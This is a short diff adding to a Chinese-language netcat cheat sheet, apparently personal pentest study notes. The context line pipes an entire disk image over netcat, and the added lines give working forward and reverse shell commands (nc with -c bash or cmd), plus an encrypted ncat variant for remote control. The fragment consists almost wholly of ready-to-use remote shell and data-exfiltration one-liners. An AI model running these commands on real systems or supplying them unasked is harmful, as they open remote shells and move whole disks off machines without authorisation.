@@ -32,3 +32,17 @@ UDP 端口：
 被拷贝 
 >dd if=/dev/sda | nc -lp 4444 -q 1 
 
+### 远程控制
+正向： 
+>nc -lp 4444 -c bash 
+>nc IP 4444
+反向： 
+>nc -lp 4444
+>nc IP 4444 -c bash 
+如果是Windows，将bash换成cmd 
+
+### NC缺乏加密和身份验证功能， 用ncat 来替换
+>ncat -c bash --allow ClientIP -nvl 4444 --ssl
+>ncat -nv ServerIP 4444 --ssl
+
+
